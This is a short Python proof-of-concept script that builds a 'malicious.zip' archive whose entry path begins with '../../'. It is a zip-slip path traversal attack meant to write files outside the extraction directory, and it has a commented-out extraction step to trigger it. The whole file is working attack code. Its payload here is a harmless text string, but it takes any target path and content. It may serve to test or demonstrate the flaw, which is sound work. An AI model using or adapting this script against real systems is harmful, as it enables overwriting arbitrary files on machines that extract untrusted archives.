import zipfile
import os

def create_malicious_zipfile(filename, target_directory, content):
    with zipfile.ZipFile(filename, 'w') as malicious_zip:
        traversal_path = os.path.join(target_directory, 'test.txt')
        malicious_file = zipfile.ZipInfo(traversal_path)
        malicious_zip.writestr(malicious_file, content)

def extract_zipfile(filename, extract_directory):
    with zipfile.ZipFile(filename, 'r') as zip_ref:
        zip_ref.extractall(extract_directory)

if __name__ == "__main__":
    # Create a malicious zip file
    malicious_zip_filename = "malicious.zip"
    target_directory = "../../"  # Modify this to the target directory
    file_content = "Works :)"
    create_malicious_zipfile(malicious_zip_filename, target_directory, file_content)

    # Extract the malicious zip file
   # extract_directory = "intended_extraction_directory"
    #extract_zipfile(malicious_zip_filename, extract_directory)